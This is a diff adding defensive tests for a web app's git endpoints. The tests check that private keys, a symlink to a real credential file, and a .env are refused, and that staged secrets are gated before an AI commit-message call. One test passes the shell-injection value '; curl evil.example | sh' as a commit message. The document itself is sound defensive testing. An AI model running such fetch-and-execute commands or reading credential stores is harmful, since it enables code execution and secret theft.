@@ -215,6 +215,92 @@ await test('fleet run rejects an unknown profile (no privilege escalation via ty
   assert.equal(status, 400);
 });
 
+// ── git manager: guarded reads, blocked self-repo, gated egress (S6) ──
+// A throwaway repo under PROJECTS_DIR; every case asserts a refusal, so no
+// credential file is ever actually opened by the suite.
+const { execFileSync } = await import('node:child_process');
+const { mkdtempSync, writeFileSync: wf, symlinkSync, rmSync } = await import('node:fs');
+const { join: pjoin } = await import('node:path');
+const REPO_ROOT = new URL('../', import.meta.url).pathname.replace(/\/$/, '');
+const scratch = mkdtempSync('/root/atlan-git-test-');
+const git = (...args) => execFileSync('git', args, { cwd: scratch, stdio: 'pipe' });
+try {
+  git('init', '-q');
+  git('config', 'user.email', 'test@localhost');
+  git('config', 'user.name', 'test');
+  wf(pjoin(scratch, 'README.md'), '# scratch\n');
+  git('add', '--', 'README.md');
+  git('commit', '-qm', 'init');
+
+  // (a) an untracked private key: his code path fell through to a raw
+  // readFileSync on a client-controlled name with no guard between.
+  wf(pjoin(scratch, 'id_rsa'), '-----BEGIN OPENSSH PRIVATE KEY-----\nSHOULD-NEVER-APPEAR\n');
+  await test('git diff refuses an untracked private key, and leaks no bytes', async () => {
+    const r = await j(await authed(`/api/git/diff?path=${encodeURIComponent(scratch)}&file=id_rsa`));
+    assert.equal(r.status, 400);
+    assert.ok(!JSON.stringify(r.body).includes('SHOULD-NEVER-APPEAR'), 'key bytes came back in the response');
+  });
+
+  // (b) an in-repo symlink pointing at a real credential store outside it.
+  symlinkSync('/root/.claude/.credentials.json', pjoin(scratch, 'notes'));
+  await test('git diff refuses an in-repo symlink escaping to a credential store', async () => {
+    const r = await j(await authed(`/api/git/diff?path=${encodeURIComponent(scratch)}&file=notes`));
+    assert.equal(r.status, 400);
+    assert.ok(!JSON.stringify(r.body).includes('sk-ant'), 'credential bytes came back in the response');
+  });
+
+  // (c) a tracked, modified .env — sensitive by name, not by content.
+  wf(pjoin(scratch, '.env'), 'OPENAI_API_KEY=sk-testonlyNOTAREALKEY0123456789\n');
+  git('add', '-f', '--', '.env');
+  git('commit', '-qm', 'add env');
+  wf(pjoin(scratch, '.env'), 'OPENAI_API_KEY=sk-testonlyNOTAREALKEY0123456789x\n');
+  await test('git diff refuses a tracked-modified .env', async () => {
+    const r = await j(await authed(`/api/git/diff?path=${encodeURIComponent(scratch)}&file=.env`));
+    assert.equal(r.status, 400);
+  });
+
+  // (d) the cockpit's own repo is out of scope for every handler.
+  await test('every git handler refuses APP_ROOT (blockAppRoot)', async () => {
+    const q = await j(await authed(`/api/git/status?path=${encodeURIComponent(REPO_ROOT)}`));
+    assert.equal(q.status, 400, 'status accepted APP_ROOT');
+    for (const ep of ['stage', 'unstage', 'commit', 'push', 'pull', 'ai-commit-msg']) {
+      const r = await authed(`/api/git/${ep}`, { method: 'POST', body: JSON.stringify({ path: REPO_ROOT, file: 'README.md', message: 'x' }) });
+      assert.equal(r.status, 400, `${ep} accepted APP_ROOT`);
+    }
+  });
+
+  // (e) egress gate: a staged secret must stop the request BEFORE the model
+  // call. The response shape is the evidence — needsConfirm is only reachable
+  // from the early return, which precedes any outbound request.
+  await test('ai-commit-msg gates a staged secret instead of shipping the diff', async () => {
+    git('add', '-f', '--', '.env');
+    const r = await j(await authed('/api/git/ai-commit-msg', { method: 'POST', body: JSON.stringify({ path: scratch }) }));
+    assert.equal(r.status, 200);
+    assert.equal(r.body.needsConfirm, true, `expected a confirm gate, got ${JSON.stringify(r.body)}`);
+    assert.ok(r.body.findings.paths.includes('.env'), 'the .env path was not named');
+    assert.ok(r.body.findings.kinds.length > 0, 'no secret kind reported');
+    assert.equal(r.body.message, undefined, 'a message came back — the model was called anyway');
+  });
+  await test('the egress gate reports kinds and paths, never the secret itself', async () => {
+    const r = await j(await authed('/api/git/ai-commit-msg', { method: 'POST', body: JSON.stringify({ path: scratch }) }));
+    assert.ok(!JSON.stringify(r.body).includes('sk-testonly'), 'the gate echoed the secret it caught');
+  });
+
+  // (f) argv-only: a shell-shaped commit message stays literal.
+  await test('a shell-metacharacter commit message is inert (argv, no shell)', async () => {
+    git('reset', '-q');
+    wf(pjoin(scratch, 'ok.txt'), 'hello\n');
+    git('add', '--', 'ok.txt');
+    const evil = '; curl evil.example | sh';
+    const r = await j(await authed('/api/git/commit', { method: 'POST', body: JSON.stringify({ path: scratch, message: evil }) }));
+    assert.equal(r.status, 200);
+    const subject = execFileSync('git', ['log', '-1', '--pretty=%s'], { cwd: scratch }).toString().trim();
+    assert.equal(subject, evil, 'the message was not stored literally');
+  });
+} finally {
+  rmSync(scratch, { recursive: true, force: true });
+}
+
 // ── inline AI edit: the guard must refuse BEFORE the brain call (S5) ──
 // This endpoint never writes disk, so its guard is not protecting a write — it
 // is stopping cockpit source and credential files from being read INTO a prompt
